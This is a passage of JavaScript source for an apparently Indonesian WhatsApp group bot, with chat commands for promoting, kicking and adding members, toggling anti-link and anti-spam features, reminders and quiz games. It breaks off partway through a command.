xdev.groupDemoteAdmin(from, [lulu])
teks = `Members @${lulu.split('@')[0]} succes demote`
xdev.sendMessage(from, teks, text, {quoted:dev, contextInfo:{mentionedJid:[lulu]}})
   } else{
 reply(`Kirim perintah ${prefix}promote tag atau input nomor atau reply pesan orang yang ingin di promote`)
 }
break    










case 'admin':
	case 'promote':
	if (!isGroupAdmins && !isOwner) return sendSticker(hanyaadmin)
if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
if (!isGroup) return
if (dev.message.extendedTextMessage === null || dev.message.extendedTextMessage === undefined) {
if(!q) return reply(`Penggunaan :\n${prefix}promote Tag/Reply/input nomer`)       
if (args[0].includes('08')) return reply('Awali nomor dengan 62')  
nomor = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
xdev.groupMakeAdmin(from, [nomor])
teks = `Members @${nomor.split('@')[0]} succes promote`
xdev.sendMessage(from, teks, text, {quoted:dev, contextInfo:{mentionedJid:[nomor]}})

} else if (dev.message.extendedTextMessage.contextInfo.participant) {
premnih = dev.message.extendedTextMessage.contextInfo.participant
if (!isGroup) return reply("Hanya bisa di group")
xdev.groupMakeAdmin(from, [premnih])
teks = `Members @${premnih.split('@')[0]} succes promote`
xdev.sendMessage(from, teks, text, {quoted:dev, contextInfo:{mentionedJid:[premnih]}})

 } else if(dev.message.extendedTextMessage.contextInfo.mentionedJid.length == 1) { 
mentioned = dev.message.extendedTextMessage.contextInfo.mentionedJid;
if (mentioned.length > 1) return reply(`Satu satu dong`)
lulu =`${mentioned[0].split('@')[0]}@s.whatsapp.net`
xdev.groupMakeAdmin(from, [lulu])
teks = `Members @${lulu.split('@')[0]} succes promote`
xdev.sendMessage(from, teks, text, {quoted:dev, contextInfo:{mentionedJid:[lulu]}})
   } else{
 reply(`Kirim perintah ${prefix}promote tag atau input nomor atau reply pesan orang yang ingin di promote`)
 }
break    
	






case 'revoke':
if (!isGroupAdmins) return sendSticker(hanyaadmin)
if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
if (!isGroup) return
await xdev.revokeInvite(from)
await reply('_Success_')
break

    
    
    case "antihidetag":
        if (!isGroup) return reply("Khusus di grup");
        if (!isGroupAdmins) return sendSticker(hanyaadmin)
		if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
        if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
          if (isAntihidetag) return reply("Sudah aktif!!");
          antihidetg.push(from);
          fs.writeFileSync(
            "./database/antihidetag.json",
            JSON.stringify(antihidetg)
          );
          reply("Sukses mengaktifkan antihidetag!");
        } else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
          antihidetg.splice(from, 1);
          fs.writeFileSync(
            "./database/antihidetag.json",
            JSON.stringify(antihidetg)
          );
          reply("Sukses mematikan antihidetag!");
        } else if (!q) {
          sendButMessage(
            from,
            `MODE ANTIHIDETAG`,
            `Silahkan pilih salah satu`,
            [
              {
                buttonId: `${prefix}antihidetag on`,
                buttonText: {
                  displayText: `on`,
                },
                type: 1,
              },
              {
                buttonId: `${prefix}antihidetag off`,
                buttonText: {
                  displayText: `off`,
                },
                type: 1,
              },
            ]
          );
        }
        break;
					
					
					
					
					
					case 'antivo':
					if (!isGroupAdmins) return sendSticker(hanyaadmin)
					     if(isExtream) return
          if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
          
          if (isAntiviewonce) return reply("Sudah aktif!!");
          antivo.push(from);
          fs.writeFileSync("./database/antivo.json", JSON.stringify(antivo));
          reply("Sukses mengaktifkan antiviewonce!");
        } else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
           
          if (!isAntiviewonce) return reply("Sudah mati!!");       
          antivo.splice(from, 1);
          fs.writeFileSync("./database/antivo.json", JSON.stringify(antivo));
          reply("Sukses mematikan antiviewonce!");
        } else if (!q) {
          sendButMessage(
            from,
            `MODE ANTI VIEW ONCE`,
            `Silahkan pilih salah satu`,
            [
              {
                buttonId: `${prefix}antivo on`,
                buttonText: {
                  displayText: `on`,
                },
                type: 1,
              },
              {
                buttonId: `${prefix}antivo off`,
                buttonText: {
                  displayText: `off`,
                },
                type: 1,
              },
            ]
          );
        }
        break;
					
					
    
case 'kick1':
case 'kicktime':
					if (!isGroupAdmins) return sendSticker(hanyaadmin)
if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
if (!isGroup) return
if (dev.message.extendedTextMessage === null || dev.message.extendedTextMessage === undefined) return reply('Reply targetnya kak')
mentioned = dev.message.extendedTextMessage.contextInfo.mentionedJid;
if (mentioned.length > 1) return reply(`*Ya jangan lebih dari satu dong kak ${pushname} nanti aku kena banned* 😒`)
if (mentioned.length < 1) {
asu = dev.message.extendedTextMessage.contextInfo.participant
if(dev.message.extendedTextMessage === ownerNumber[0]) return reply('Tidak bisa kick owner')
aw =fs.readFileSync('./sticker/bismilah.webp')
                   setTimeout( () => {
                   sendSticker1(aw)
                     }, 10000)
                   setTimeout( () => {
					xdev.sendMessage(from, 'Yok sama" Al-fatihah 😁', text)
					}, 8000)
					setTimeout( () => {
					reply('Sukses kak 😆')
					}, 7000)
					setTimeout( () => {
					xdev.groupRemove(from, [asu])
					}, 6000)
					setTimeout( () => {
					xdev.sendMessage(from, `Bismilah Kick`, text) // ur cods
					}, 5000)
					setTimeout( () => {
					xdev.sendMessage(from, 'Asekk dapet dapet jatah kick 😋', text)
					}, 2500)
					setTimeout( () => {
					reply('Perintah diterima kak 😃')
					}, 0)
					} else {
                   if (mentioned.includes(ownerNumber[0])) return reply(`Tidak bisa kick Owner`)
                    if (mentioned.includes(from.split("-")[0] + '@s.whatsapp.net')) return reply(`Tidak bisa kick owner group`)
                    uw =fs.readFileSync('./sticker/bismilah.webp')
                   setTimeout( () => {
                   sendSticker1(uw)
                     }, 10000)
                   setTimeout( () => {
					xdev.sendMessage(from, 'Yok sama" Al-fatihah 😁', text)
					}, 8000)
					setTimeout( () => {
					reply('Sukses kak 😆')
					}, 7000)
					setTimeout( () => {
					 xdev.groupRemove(from, [mentioned[0]])
					}, 6000)
					setTimeout( () => {
					xdev.sendMessage(from, `Bismilah Kick`, text) // ur cods
					}, 5000)
					setTimeout( () => {
					xdev.sendMessage(from, 'Asekk dapet dapet jatah kick ??', text)
					}, 2500)
					setTimeout( () => {
					reply('Perintah diterima kak 😃')
					}, 0)
                    }
                     break    
					
					
					case 'kickme':
					try{
					if (!isGroupAdmins) return sendSticker(hanyaadmin)
if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
if (!isGroup) return
await xdev.groupRemove(from, [sender])
await reply("Done wkwkw")
} catch (err){
	reply(err)
	}
break
					


    
    case 'kick':
	if (!isGroupAdmins) return sendSticker(hanyaadmin)
if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
if (!isGroup) return
if (dev.message.extendedTextMessage === null || dev.message.extendedTextMessage === undefined) {
if(!q) return reply(`Penggunaan :\n${prefix}kick Tag/Reply/input nomer\n\nPilih waktu\ns = detik\nh = jam\nd =hari\n\nContoh: ${prefix}kick +62xxx 1h`)       
if (args[0].includes('08')) return reply('Awali nomor dengan 62')  
woke = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
if(woke === ownerNumber[0]) return reply("Ga mau")
await xdev.groupRemove(from, [woke])
    
} else if (dev.message.extendedTextMessage.contextInfo.participant) {
if (!isGroup) return reply("Hanya bisa di group")
asu = dev.message.extendedTextMessage.contextInfo.participant
Nomer =`${asu.split("@")[0]}@s.whatsapp.net`
if(Nomer === ownerNumber[0]) return reply("Ga mau")
await reply( `Modar kena kick awokawok 🤣`);
await xdev.groupRemove(from, [asu])
    
 } else if(dev.message.extendedTextMessage.contextInfo.mentionedJid.length == 1) { 
mentioned = dev.message.extendedTextMessage.contextInfo.mentionedJid;
if (mentioned.length > 1) return reply(`Satu satu dong`)
if (mentioned.includes(ownerNumber[0])) return reply(`Tidak bisa kick Owner`)
if (mentioned.includes(from.split("-")[0] + '@s.whatsapp.net')) return reply(`Tidak bisa kick owner group`)
await reply(`Asek dapet jatah kick, Otw kick 😋`);
await xdev.groupRemove(from, [mentioned[0]])

   } else{
 reply(`Kirim perintah ${prefix}kick @tag atau nomor atau reply pesan orang yang ingin di kick`)
 }
break    






    
    case 'welcome':
    if (!isGroupAdmins) return sendSticker(hanyaadmin)
                    if(isExtream) return
					if (!isGroup) return reply('hanya bisa di group')
					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
						if (isWelkom) return reply('Fitur welcome sudah aktif kak')
						welkom.push(from)
						fs.writeFileSync('./database/welkom.json', JSON.stringify(welkom))
						let ih =`Fitur welcome telah aktif`
                    xdev.sendMessage(from, ih, text, { quoted: ftext, contextInfo: forward})
					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
						if (!isWelkom) return reply('Udah mati')
						welkom.splice(from, 1)
						fs.writeFileSync('./database/welkom.json', JSON.stringify(welkom))
						let ih =`Fitur welcome telah di matikan`
                    xdev.sendMessage(from, ih, text, { quoted: ftext, contextInfo: forward})
					}else if (!q) {
                      sendButMessage(from, `MODE WELCOME`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}welcome on`, buttonText: {displayText: `ᴏɴ`,},type: 1},
                      {buttonId: `${prefix}welcome off`, buttonText: { displayText: `ᴏғғ`,},type: 1}]);
                    }
                 break;                 







                 
                 case 'antidel':
                 case 'antidelete':
    if (!isGroupAdmins && !isOwner) return sendSticker(hanyaadmin)
                    if(isExtream) return
					if (!isGroup) return reply('hanya bisa di group')
					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
						if (isAntidel) return reply('Fitur welcome sudah aktif kak')
						antidel.push(from)
						fs.writeFileSync('./database/antidelete.json', JSON.stringify(antidel))
						let ih =`Fitur anti delete telah aktif`
                    xdev.sendMessage(from, ih, text, { quoted: ftext, contextInfo: forward})
					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
						if (!isAntidel) return reply('Udah mati')
						antidel.splice(from, 1)
						fs.writeFileSync('./database/antidelete.json', JSON.stringify(antidel))
						let ih =`Fitur anti delete telah di matikan`
                    xdev.sendMessage(from, ih, text, { quoted: ftext, contextInfo: forward})
					}else if (!q) {
                      sendButMessage(from, `MODE ANTI DELETE`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}antidel on`, buttonText: {displayText: `ᴏɴ`,},type: 1},
                      {buttonId: `${prefix}antidel off`, buttonText: { displayText: `ᴏғғ`,},type: 1}]);
                    }
                 break;
                 
                 
                 
      case 'antilinkgc':
      if (!isGroupAdmins) return sendSticker(hanyaadmin)
					if (!isGroup) return reply('hanya bisa di group')
					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
						if (isAntilinkGc) return reply('Fitur sudah aktif kak')
						linkgcnya.push(from);
						fs.writeFileSync("./database/gcdetec.json", JSON.stringify(linkgcnya))
						let ih =`Fitur antilink group telah di aktifkan`
                    xdev.sendMessage(from, ih, text, { quoted: ftext, contextInfo: forward})
					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
						if (!isAntilinkGc) return reply('Udah mati')
						linkgcnya.splice(from, 1);
						fs.writeFileSync("./database/gcdetec.json", JSON.stringify(linkgcnya))
						let ih =`Fitur antilink group telah di matikan`
                    xdev.sendMessage(from, ih, text, { quoted: ftext, contextInfo: forward})
					}else if (!q) {
                      sendButMessage(from, `MODE ANTI LINK GROUP`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}antilinkgc on`, buttonText: {displayText: `ᴏɴ`,},type: 1},
                      {buttonId: `${prefix}antilinkgc off`, buttonText: { displayText: `ᴏғғ`,},type: 1}]);
                    }
                 break;
    
    case 'antilink':
    if (!isGroupAdmins) return sendSticker(hanyaadmin)
					if (!isGroup) return reply('hanya bisa di group')
					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
						if (isAntiLink) return reply('Fitur sudah aktif kak')
						antilink.push(from);
						fs.writeFileSync("./database/antilink.json", JSON.stringify(antilink))
						let ih =`Fitur antilink telah di aktifkan`
                    xdev.sendMessage(from, ih, text, { quoted: ftext, contextInfo: forward})
					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
						if (!isAntiLink) return reply('Udah mati')
						antilink.splice(from, 1);
						fs.writeFileSync("./database/antilink.json", JSON.stringify(antilink))
						let ih =`Fitur antilink telah di matikan`
                    xdev.sendMessage(from, ih, text, { quoted: ftext, contextInfo: forward})
					}else if (!q) {
                      sendButMessage(from, `MODE ANTI LINK`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}antilink on`, buttonText: {displayText: `ᴏɴ`,},type: 1},
                      {buttonId: `${prefix}antilink off`, buttonText: { displayText: `ᴏғғ`,},type: 1}]);
                    }
                 break;
    
    
    
    
    




					
					
					case "antivirtex":
	    if(isExtream) return
		if (!isGroupAdmins) return sendSticker(hanyaadmin)
        if (!isGroup) return reply('Kusus group')
        if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
        if (AntiVirtex) return reply('Sudah Aktif')
          antivirtex.push(from);
          fs.writeFileSync(
            "./database/antivirtex.json",
            JSON.stringify(antivirtex)
          );
          reply("Sukses mengaktifkan antivirtex!");
        } else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
        if (!AntiVirtex) return reply('Sudah Mati')
          antivirtex.splice(from, 1);
          fs.writeFileSync("./database/antivirtex.json", JSON.stringify(antivirtex));
          reply("Sukses mematikan antivirtex!");
        } else if (!q) {
          sendButMessage(from, `MODE ANTIVIRTEX`, `Silahkan pilih salah satu`, [
            {
              buttonId: `${prefix}antivirtex on`,
              buttonText: {
                displayText: `on`,
              },
              type: 1,
            },
            {
              buttonId: `${prefix}antivirtex off`,
              buttonText: {
                displayText: `off`,
              },
              type: 1,
            },
          ]);
        }
        break;
        
        


  
  	
        case 'kickarea': // Anti Banned
        if(!isGroup) return reply("Hanya bisa di group")
        await reply("_Prosses_")
        for (let i of groupMembers){
        if(i.jid.includes("+1")){
    	await xdev.groupRemove(from, [i.jid.includes("+1")]);
         }
         }
        break
        
        
        
        case "kickarea":
        case "antiasing":
      if (!isGroup) return reply('Kusus group')
if (!isGroupAdmins) return sendSticker(hanyaadmin)
			if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
        if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
          if (isKickarea) return reply("Sudah aktif!!");
          kickarea.push(from);
          fs.writeFileSync(
            "./database/antibule.json",
            JSON.stringify(kickarea)
          );
          reply("Sukses mengaktifkan kickarea!");
        } else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
          kickarea.splice(from, 1);
          fs.writeFileSync(
            "./database/antibule.json",
            JSON.stringify(kickarea)
          );
          reply("Sukses mematikan kickarea!");
        } else if (!q) {
          sendButMessage(from, `MODE KICKAREA`, `Silahkan pilih salah satu`, [
            {
              buttonId: `${prefix}kickarea on`,
              buttonText: {
                displayText: `on`,
              },
              type: 1,
            },
            {
              buttonId: `${prefix}kickarea off`,
              buttonText: {
                displayText: `off`,
              },
              type: 1,
            },
          ]);
        }
        break;
					
					
					
					
					
					


case 'add':
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return sendSticker(hanyaadmin)
			        if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
			     
						if (args.length < 1) {
                               entah = dev.message.extendedTextMessage.contextInfo.participant
													response = await xdev.groupAdd(from, [entah])
													o = response.participants[0]
													let inv = (Object.values(o))
													if(inv[0].code == 409) return reply('Target Sudah Di Didalam Group!')
													if(inv[0].code == 403) return reply('Gagal, Karena Di Private')
													if(inv[0].code == 408) return reply(`Gagal menambah kan doi dengan alasan: *Dia baru keluar group baru-baru ini*`)
													if(inv[0].code == 401) return reply(`Gagal menambah kan doi dengan alasan: *Bot di block oleh yang bersangkutan*`)
                      await xdev.sendMessage(from,`Berhasil menambahkan @${entah.split("@")[0]} ke dalam group ${groupName}`,text);          
                      } else if (dev.message.extendedTextMessage === null || dev.message.extendedTextMessage === undefined) {
                  	if (args[0].startsWith('08')) return reply('Awali nomor dengan 62')
					  woke = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
											response = await xdev.groupAdd(from, [woke])
											o = response.participants[0]
											let inv = (Object.values(o))
											if(inv[0].code == 409) return reply('Target Sudah Di Didalam Group!')
											if(inv[0].code == 403) return reply('Eror, user private acc')
											if(inv[0].code == 408) return reply(`Gagal menambah kan doi dengan alasan: *Dia baru keluar group baru-baru ini*`)
													if(inv[0].code == 401) return reply(`Gagal menambah kan doi dengan alasan: *Bot di block oleh yang bersangkutan*`)
						await xdev.sendMessage(from,`Berhasil menambahkan ${q} ke dalam group ${groupName}`,text);          
						}else{
						reply("Reply atau input nomer target")
						}
					break
    
    case 'getppgc':
					if (!isGroup) return 
					reply(mess.wait)
					ahenak = from
		if (`${ahenak}@g.us`) {
		try {
					ppimg = await xdev.getProfilePicture(ahenak)
				} catch {
					ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
				}
				metadete = await xdev.groupMetadata(ahenak)
				uh = await xdev.getProfilePicture(ahenak)
				buffer = await getBuffer(uh)
				xdev.sendMessage(from, buffer, image, {quoted: dev})
		} 
  break
  
  
									
									
									
									case 'sewacheck': case 'ceksewa':  case 'sewacek':
									if (!isGroup) return reply(mess.only.group)
									if (!isSewa) return reply(`Group ini tidak terdaftar dalam list sewabot. Ketik ${prefix}sewabot untuk info lebih lanjut`)
									let cekid = ms(_sewa.getSewaExpired(from, sewa) - Date.now())
									let sewenye = `「 *SEWA EXPIRE* 」
*Group*: ${groupName}
*ID*: ${from}
*EXPIRE :* ${cekid.days} Hari, ${cekid.hours} Jam, ${cekid.minutes} Menit, ${cekid.seconds} Detik`
									reply(sewenye)
									break
									
    
    case 'infogc':
           case 'infogrup':
            case 'infogroup':
            case 'grupinfo':
            case 'groupinfo':
                if (!isGroup) return reply('Hanya bisa di dalam group')
                 
                try {
                    var pic = await xdev.getProfilePicture(from)
                } catch {
                    var pic = 'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'
                }
                
                let ingfo = `
*G R O U P I N F O*
*Name :* ${groupName}
*ID Grup :* ${from}
*Dibuat :* ${moment(`${groupMetadata.creation}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}
*Jumlah Admin :* ${groupAdmins.length}
*Jumlah Peserta :* ${groupMembers.length}
*AntiLink :* ${isAntiLink ? 'ON' : 'OFF'}
*AntiViewOnce :* ${isAntiviewonce ? 'ON' : 'OFF'}
*AntiBadword :* ${Toxic ? 'ON' : 'OFF'}
*Antibuggc :* ${Antibuggc ? 'ON' : 'OFF'}
*Antiasing :* ${isKickarea ? 'ON' : 'OFF'}
*Antivirtex :* ${AntiVirtex ? 'ON' : 'OFF'}
*Desc :* \n${groupMetadata.desc}`
                xdev.sendMessage(from, ingfo, text, {
                    'contextInfo': {  
                        'text': '🔥',
                        'forwardingScore': 10000000,
                        'isForwarded': true,
                        'sendEphemeral': true,
                        'externalAdReply': {
                            'title':`${groupName}`,
                            'body': '',
                            'previewType': 'PHOTO',
                           
                            'thumbnail': await getBuffer(pic),
                            'sourceUrl': ''
                        }
                    }
             })
                break
           
                            
                          
           case 'getidgc':
           if(!isGroup) return reply("Hanya bisa di group")
           reply(`${from}`)
           break
    
    case "reminder": // by Slavyan
        if (!q)
         return reply(
            `CONTOH PENGGUNANNYA:\n${prefix}reminder text/2s\n\nNOTE: \n*s* - seconds\n*m* - minutes\n*h* - hours\n*d* - days`
          );

        teks = body.slice(10);
        const messRemind = teks.split("/")[0];
        const timeRemind = teks.split("/")[1];
        typeRemind = "Text";
        if (isQuotedImage) typeRemind = "Image";
        if (isQuotedSticker) typeRemind = "Sticker";
        if (isQuotedAudio) typeRemind = "Audio";
        if (!isQuotedImage && !isQuotedAudio && !isQuotedSticker)
          typeRemind = "Text";
        const parsedTime = ms(toMs(timeRemind));
        reminder.addReminder(
          sender,
          messRemind,
          typeRemind,
          timeRemind,
          _reminder
        );
        if (!isQuotedImage && !isQuotedSticker && !isQuotedAudio) {
          await xdev.sendMessage(
            from,
            `── 「 REMINDER 」 ──
    
Reminder berhasil diaktifkan!
➸ Pesan: ${messRemind}
➸ Type: Text
➸ Durasi: ${parsedTime.hours} jam ${parsedTime.minutes} menit ${
              parsedTime.seconds
            } detik
➸ Untuk: @${sender.split("@")[0]}
    `,
            text,
            { contextInfo: { mentionedJid: [sender] } }
          );
          const intervRemind = setInterval(async () => {
            if (Date.now() >= reminder.getReminderTime(sender, _reminder)) {
              yamete = await reminder.getReminderMsg(sender, _reminder);
              xdev.sendMessage(
                from,
                `── 「 REMINDER 」 ──

⏰ @${sender.split("@")[0]} ⏰
➸ Pesan: ${messRemind}
➸ Type: ${reminder.getReminderType(sender, _reminder)}`,
                text,
                { contextInfo: { mentionedJid: [sender] } }
              );
              _reminder.splice(
                reminder.getReminderPosition(sender, _reminder),
                1
              );
              fs.writeFileSync(
                "./database/reminder.json",
                JSON.stringify(_reminder)
              );
              clearInterval(intervRemind);
            }
          }, 1000);
        } else if (isQuotedSticker) {
          encmedia = JSON.parse(JSON.stringify(dev).replace("quotedM", "m"))
            .message.extendedTextMessage.contextInfo;
          media = await xdev.downloadAndSaveMediaMessage(encmedia);
          await xdev.sendMessage(
            from,
            `── 「 REMINDER 」 ──
    
Reminder berhasil diaktifkan!
➸ Pesan: ${messRemind}
➸ Type: Sticker
➸ Durasi: ${parsedTime.hours} jam ${parsedTime.minutes} menit ${
              parsedTime.seconds
            } detik
➸ Untuk: @${sender.split("@")[0]}
    `,
            text,
            { contextInfo: { mentionedJid: [sender] } }
          );
          const intervRemind = setInterval(async () => {
            if (Date.now() >= reminder.getReminderTime(sender, _reminder)) {
              yamete = await reminder.getReminderMsg(sender, _reminder);
              xdev.sendMessage(
                from,
                `── 「 REMINDER 」 ──

⏰ @${sender.split("@")[0]} ⏰
➸ Pesan: ${messRemind}
➸ Type: ${reminder.getReminderType(sender, _reminder)}`,
                text,
                { contextInfo: { mentionedJid: [sender] } }
              );
              xdev.sendMessage(from, fs.readFileSync(media), sticker);
              _reminder.splice(
                reminder.getReminderPosition(sender, _reminder),
                1
              );
              fs.writeFileSync(
                "./database/reminder.json",
                JSON.stringify(_reminder)
              );
              clearInterval(intervRemind);
            }
          }, 1000);
        } else if (isQuotedImage) {
          encmedia = isQuotedImage
            ? JSON.parse(JSON.stringify(dev).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : dev;
          media = await xdev.downloadAndSaveMediaMessage(encmedia);
          await xdev.sendMessage(
            from,
            `── 「 REMINDER 」 ──
    
Reminder berhasil diaktifkan!
➸ Pesan: ${messRemind}
➸ Type: Image
➸ Durasi: ${parsedTime.hours} jam ${parsedTime.minutes} menit ${
              parsedTime.seconds
            } detik
➸ Untuk: @${sender.split("@")[0]}
    `,
            text,
            { contextInfo: { mentionedJid: [sender] } }
          );
          const intervRemind = setInterval(async () => {
            if (Date.now() >= reminder.getReminderTime(sender, _reminder)) {
              yamete = await reminder.getReminderMsg(sender, _reminder);
              teks = `── 「 REMINDER 」 ──

⏰ @${sender.split("@")[0]} ⏰
➸ Pesan: ${messRemind}
➸ Type: ${reminder.getReminderType(sender, _reminder)}`;
              xdev.sendMessage(from, media, image, {
                contextInfo: { mentionedJid: [sender] },
                caption: teks,
              });
              _reminder.splice(
                reminder.getReminderPosition(sender, _reminder),
                1
              );
              fs.writeFileSync(
                "./database/reminder.json",
                JSON.stringify(_reminder)
              );
              clearInterval(intervRemind);
            }
          }, 1000);
        } else if (isQuotedAudio) {
          encmedia = JSON.parse(JSON.stringify(dev).replace("quotedM", "m"))
            .message.extendedTextMessage.contextInfo;
          media = await xdev.downloadAndSaveMediaMessage(encmedia);
          await xdev.sendMessage(
            from,
            `── 「 REMINDER 」 ──
    
Reminder berhasil diaktifkan!
➸ Pesan: ${messRemind}
➸ Type: Audio
➸ Durasi: ${parsedTime.hours} jam ${parsedTime.minutes} menit ${
              parsedTime.seconds
            } detik
➸ Untuk: @${sender.split("@")[0]}
    `,
            text,
            { contextInfo: { mentionedJid: [sender] } }
          );
          const intervRemind = setInterval(async () => {
            if (Date.now() >= reminder.getReminderTime(sender, _reminder)) {
              yamete = await reminder.getReminderMsg(sender, _reminder);
              xdev.sendMessage(
                from,
                `── 「 REMINDER 」 ──

⏰ @${sender.split("@")[0]} ⏰
➸ Pesan: ${messRemind}
➸ Type: ${reminder.getReminderType(sender, _reminder)}`,
                text,
                { contextInfo: { mentionedJid: [sender] } }
              );
              xdev.sendMessage(from, fs.readFileSync(media), audio, {
                contextInfo: { mentionedJid: [sender] },
                mimetype: "audio/mp4",
                ptt: true,
                caption: teks,
              });
              _reminder.splice(
                reminder.getReminderPosition(sender, _reminder),
                1
              );
              fs.writeFileSync(
                "./database/reminder.json",
                JSON.stringify(_reminder)
              );
              clearInterval(intervRemind);
            }
          }, 1000);
        }
        break;
           
    
    
       //------------------< Enable / Disable >-------------------
            case 'antibadword':
            case 'antitoxic':
                 if(isExtream) return
                if (!isGroup) return reply('Hanya bisa di group')
                if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
                    if (Toxic) return reply(`Udah aktif`)
                    grupbadword.push(from)
					fs.writeFileSync('./database/grupbadword.json', JSON.stringify(grupbadword))
					reply(`antibadword grup aktif, kirim ${prefix}listbadword untuk melihat list badword`)
                } else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
                    yahu = grupbadword.indexOf(from)
                    grupbadword.splice(yahu, 1)
                    fs.writeFileSync('./database/grupbadword.json', JSON.stringify(grupbadword))
                    reply('antibadword grup nonaktif')
                } else if (!q) {
                      sendButMessage(from, `MODE ANTI BADWORD`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}antibadword on`, buttonText: {displayText: `ᴏɴ`,},type: 1},
                      {buttonId: `${prefix}antibadword off`, buttonText: { displayText: `ᴏғғ`,},type: 1}]);
                    }
                 break;
    
    
    
    
    
    
    
    
    
    
    case 'setppgrup': 
    case 'setppgc':
									if (!isGroup) return reply(mess.only.group)
									if (!isGroupAdmins && !isOwner) return reply(mess.only.admin)
									if (!isBotGroupAdmins) return reply(`Jadikan Bot Sebagai Admin Group!`)
									if (isQuotedImage) {
										let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
										let media = await xdev.downloadMediaMessage(encmedia)
										xdev.updateProfilePicture(from, media)
										//.then((res) => reply(jsonformat(res)))
										//.catch((err) => reply(jsonformat(err)))
										} else if (isQuotedSticker){
											if (dev.message.videoMessage) return reply('Error Bro Wkwkwk')
											encmedia = JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo
											media = await xdev.downloadAndSaveMediaMessage(encmedia)
											ran = getRandom('.png')
											exec(`ffmpeg -i ${media} ${ran}`, (err) => {
												fs.unlinkSync(media)
												if (err) return reply('Eror Lord')
												buffer = fs.readFileSync(ran)
												xdev.updateProfilePicture(from, buffer)
												fs.unlinkSync(ran)
												})
											} else {
												reply(`Kirim atau tag gambar dengan caption ${prefix + command}`)
											}
									break
    
    
    
    

    
    
    case 'caklontong': case 'ckl':{
                    if (!isGroup) return reply(mess.only.group)
                    if (isGame(sender, isOwner, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
                    if (game.isCkl(from, caklontong)) return reply(`Masih ada soal yang belum di selesaikan`)
                    data = fs.readFileSync('./lib/game/caklontong.js');
				    jsonData = JSON.parse(data);
				    randIndex = Math.floor(Math.random() * jsonData.length);
				    randKey = jsonData[randIndex];
                    const petunjuk = randKey.result.jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-')
                    reply(`*JAWABLAH SOAL BERIKUT*\n\nSoal : ${randKey.result.soal}\n\nPetunjuk : ${petunjuk}\n\nWaktu : ${gamewaktu} detik`)
                    let ikasayank = randKey.result.jawaban.toLowerCase()
                    game.addckl(from, ikasayank, gamewaktu, caklontong)
                    gameAdd(sender, glimit)
                     }
                    break
    
    
    
    
    case 'family100':{
                      if (isGame(sender, isOwner, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
                      if (!isGroup) return reply(mess.only.group)
                      if (game.isfam(from, family100)) return reply(`Masih ada soal yang belum di selesaikan`)
                      data = fs.readFileSync('./lib/game/family100.js');
				      fami = JSON.parse(data);
				      ly100 = Math.floor(Math.random() * fami.length);
				      randKey = fami[ly100];
				      Pertanyaan = randKey.result.soal
                      reply(`*JAWABLAH SOAL BERIKUT*\n\n*Soal :* ${Pertanyaan}\n*Total Jawaban :* ${randKey.result.jawaban.length }\n\nWaktu : ${gamewaktu} detik`)
                      let anoh = randKey.result.jawaban
                      let rgfds = []
                      for (let i of anoh){
                      let fefs = i.split('/') ? i.split('/')[0] : i
                      let iuhbb = fefs.startsWith(' ') ? fefs.replace(' ','') : fefs
                      let axsf = iuhbb.endsWith(' ') ? iuhbb.replace(iuhbb.slice(-1), '') : iuhbb
                      rgfds.push(axsf.toLowerCase())
                        }
                       game.addfam(from, rgfds, gamewaktu, family100)
                       gameAdd(sender, glimit)
                         }
                         break
    
    
    

           case 'tebakbendera': case 'tb':{
                     if (!isGroup) return reply(mess.only.group)
